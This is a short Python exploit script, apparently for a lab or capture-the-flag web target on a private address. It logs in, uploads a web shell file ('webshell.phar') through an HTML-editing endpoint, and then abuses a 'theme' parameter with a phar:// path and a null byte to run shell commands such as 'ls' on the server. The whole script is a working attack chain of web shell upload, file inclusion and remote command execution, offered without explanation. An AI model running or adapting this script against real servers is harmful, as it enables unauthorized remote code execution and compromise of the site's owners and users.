import requests
from datetime import datetime
url = "http://192.168.146.130:8888/"
sess = requests.session()
sess.get(url)
sess.post(url, data={
    "username":"asef18766",
    "password":"asef18766",
    "current_time":int(datetime.now().timestamp())
})
def upload_css():
    with sess.post(f"{url}/edithtml.php", data={"html":open("webshell.phar", "rb").read()}) as resp:
        print(resp.status_code)
        print(resp.text)
def get_view():
    with sess.get(f"{url}/view.php", params={"theme":"phar://index.html\x00", "cmd":"ls"}) as resp:
        print(resp.text)
#upload_css()
get_view()